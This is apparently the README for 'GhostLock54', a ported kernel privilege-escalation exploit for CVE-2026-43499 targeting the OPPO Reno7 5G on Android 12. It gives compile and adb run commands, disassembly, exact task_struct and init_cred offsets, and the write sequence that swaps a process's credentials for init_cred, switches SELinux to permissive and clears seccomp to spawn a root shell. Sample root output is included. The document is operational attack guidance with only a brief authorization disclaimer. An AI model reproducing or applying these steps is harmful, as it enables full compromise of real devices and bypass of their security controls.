GhostLock54 for OPPO Reno7 5G

针对 OPPO Reno7 5G（型号 OP5227）的 GhostLock（CVE-2026-43499）移植版。

目标内核：5.4.254-qgki-gaa96eae94d32，Android 12。

本程序通过 futex PI 越界写获得内核任意写原语，把目标进程的 cred 指针整体替换为 init_cred，并清掉 seccomp，达到：

· 真实 uid=0 / gid=0 / euid=0 / egid=0
· 完整 capability 集合（CapPrm / CapEff / CapBnd = 0x0000003fffffffff，来自 init_cred）
· SELinux 切换为 Permissive（enforce 1 → 0）
· 清目标任务的 task_struct.seccomp，让子进程 fork 后不再被 Android seccomp filter 拦截（Seccomp: 0）
· 通过 libselinux 的 setcon() 把子进程上下文从 u:r:kernel:s0 切到 u:r:shell:s0
· 提权成功后，直接在当前终端原地弹出一个拥有完整 Root 权限的 # Shell，context 为 shell 域

重要提示（防内核崩溃）：由于漏洞利用后必须保持主进程存活以防内核悬挂指针引发崩溃（Kernel Panic），父进程会原地进入死循环挂起。当你在弹出的 # shell 中输入 exit 退出后，父进程依然在后台挂起。此时如果你想彻底结束程序，直接按电源键重启手机即可。

编译

需要 libselinux（Android 系统核心库，bionic 环境自带头文件和动态库）：

```sh
clang -O2 -pthread ghostlock54.c -o ghostlock54 -lselinux
```

如果提示找不到 selinux/selinux.h，说明当前编译环境不是 Termux 或 NDK 内置路径，需要额外指定：

```sh
clang -O2 -pthread ghostlock54.c -o ghostlock54 \
  -I/data/data/com.termux/files/usr/include \
  -L/data/data/com.termux/files/usr/lib -lselinux
```

运行

编译完成后，将可执行文件推送到设备并赋予执行权限：

```sh
adb push ghostlock54 /data/local/tmp/ghostlock54
adb shell chmod 755 /data/local/tmp/ghostlock54
```

启动漏洞利用：

```sh
adb shell -t /data/local/tmp/ghostlock54
```

程序跑完后，终端会直接变成 # 提示符，此时你已获得 Root 权限。你可以直接在里面执行任意命令，例如查看状态：

```sh
id
getenforce
cat /proc/self/attr/current
```

程序输出示例（child 阶段）：

```
[+] [CHILD] uid=0 gid=0 euid=0 egid=0
[+] [CHILD] CapPrm:     0000003fffffffff
[+] [CHILD] CapEff:     0000003fffffffff
[+] [CHILD] CapBnd:     0000003fffffffff
[+] [CHILD] context: u:r:kernel:s0 -> u:r:shell:s0
[+] [CHILD] Running root action. Launching shell...
```

/proc/self/status 示例：

```
Uid:    0       0       0       0
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
Seccomp:        0
```

CapEff 为 0x3fffffffff，即 bit 0..37 全 1，共 38 位，对应 Linux 5.4 内核已知的全部 capability（CAP_LAST_CAP = 37，CAP_AUDIT_READ）。这是因为 cred 指针被整体替换为 init_cred，而非逐位写入 cap 位图。init_cred 自带完整 cap 集合，且 user_ns 指向 init_user_ns，不受 SECURE_NOROOT 等 securebits 影响。

SELinux 上下文切换

exploit 完成 cred 替换后，child 进程的 uid 是 0、CapEff 全满，但 context 仍是 u:r:kernel:s0——因为 cred->security 的 sid 来自 init_cred，而 init_cred 绑定的是 kernel 域的 sid。

要把 context 切到 shell 域，child 在 exec /system/bin/sh 之前调用：

```c
setcon("u:r:shell:s0");
```

setcon 是 libselinux 提供的用户态封装，底层等价于 open("/proc/self/attr/current") + write()，会经过 SELinux 的 selinux_setprocattr() 和 avc_has_perm(current_sid, new_sid, PROCESS__SETCURRENT) 检查。该检查需要 CAP_MAC_ADMIN；此时 child 已是 init_cred（全 cap），cap 检查通过；策略层面，本设备允许 kernel 域 setcurrent 到 shell 域，所以 errno=0，切换成功。

切换是单向放宽的：kernel → shell 允许，但普通 shell 域（无 root、无 cap）无法 setcurrent 到 kernel 域。只有拿全 cap 的 kernel 域 root，才能自由 setcon 到任意放宽的目标域。

如果要保留 kernel 域身份（比如需要写 /sys/fs/selinux/policy、加载内核模块），把 setcon 那一行注释掉即可，child 会以 u:r:kernel:s0 启动 root shell。

实现要点

越界写必须选可写地址

反汇编 rb_erase 可见写入路径末尾会 dereference 被写值：

```
ffffffc011705d58:  str x9, [x8, #8]     ; *(target) = value
ffffffc011705d5c:  cbz x9, #0xffffffc011705e04
ffffffc011705d60:  str x10, [x9]        ; *(value) = x10   <-- 会解引用
```

因此 value 必须是可读写内核地址。这里用 k_write_value = (__log_buf 上界 + 0xffff) & ~0xffff 作为底，再或上 0xffff 掩码。deref 落在 __log_buf 同一 64 KiB 页内，安全。

cred 指针替换

本版本采用 cred 整体替换，不逐字段改 cred：

· 读 init_task 附近的 init_cred 静态地址（偏移 0x2caf850），由 KASLR slide 推导
· 把 child 的 task->cred（+0x808）和 task->real_cred（+0x800）都指向 init_cred
· 修补 init_cred->uid / gid（+0x04），确保 uid=0（init_cred 原本就是 0，保险起见再写一次）

相比逐字段改 uid / cap / securebits，指针替换只写 4 次，而且全 cap 天然生效，不会出现 cap_bset 与 cap_effective 不一致的问题。

关键偏移

task_struct.seccomp 由 __secure_computing 的 mrs x8, sp_el0; ldr w9, [x8, #0x8d0] 反汇编得到；init_cred 地址由 init_task 符号和本地偏移交叉验证。

字段 偏移
cred->uid / gid +0x04 / +0x08
task->real_cred +0x800
task->cred +0x808
task->seccomp +0x8d0
init_task 0x2ca2800（静态链接基址相对偏移）
init_cred 0x2caf850

fake lock 窗口

write_value() 每次消耗一个 fake lock 窗口，windows[] 共 10 个：

```
0xa80, 0xb00, 0xb80, 0xc00, 0xc80,
0xd00, 0xd80, 0xe00, 0xe80,
0xf00
```

当前 exploit 只消耗 5 个（见下方写入顺序），剩余 5 个是预留窗口，供未来扩展使用。第 11 次写会 pr_error("Out of fake lock windows!") 直接退出。要加写操作必须同时扩 windows[]，并确认新偏移仍在 selinux_state 那一页内、不越过 empty_zero_page（0x1000）。

写入顺序（实际 5 次）

1. selinux_state ← k_write_value（enforce 1 → 0，切 Permissive）
2. child_task+0x808 ← init_cred（task->cred）
3. child_task+0x800 ← init_cred（task->real_cred）
4. init_cred+0x04 ← 0（init_cred 的 uid / gid 修复）
5. child_task+0x8d0 ← 0（seccomp mode 清零）

顺序选择的原因：先切 SELinux permissive，确保后续写 task 字段不会被 SELinux 审计卡住（虽然本轮是内核任意写，不经 LSM 检查，但 permissive 能避免写完后系统行为异常）；然后写 cred、real_cred，最后清 seccomp。

历史版本曾逐字段写 cred 的 uid / gid / securebits / cap_inheritable / cap_permitted / cap_effective / cap_bset / cap_ambient，共 5 + 5 = 10 次写，且必须严格按 +0x38 → +0x30 → +0x40 → +0x28 → +0x48 的顺序避开 rb_erase 读取 parent 时的污染。本版本改为 cred 指针替换，已不需要这套严格顺序，仅保留 init_cred 修复作为兜底。

安全说明

· 仅针对上述设备/内核标定。换内核必须重新反汇编验证所有偏移和栈几何，否则极易 panic。
· 主进程保活机制：成功利用后，内核 PI 引用指向存活的工作线程内核栈。为了防止主进程退出导致 Y 线程栈释放而触发 Kernel Panic，主进程会进入 for(;;) pause(); 死循环。
· 不要试图 kill -9 挂起的漏洞主进程，否则悬挂的 fake waiter 被别的进程取到会瞬间 Panic 重启。
· 恢复系统到正常状态（SELinux 回 enforcing、清理内核内残留 PI 引用）只能靠重启（adb reboot）。
· 仅在你自己拥有或明确授权测试的设备上使用。

许可证

Apache License 2.0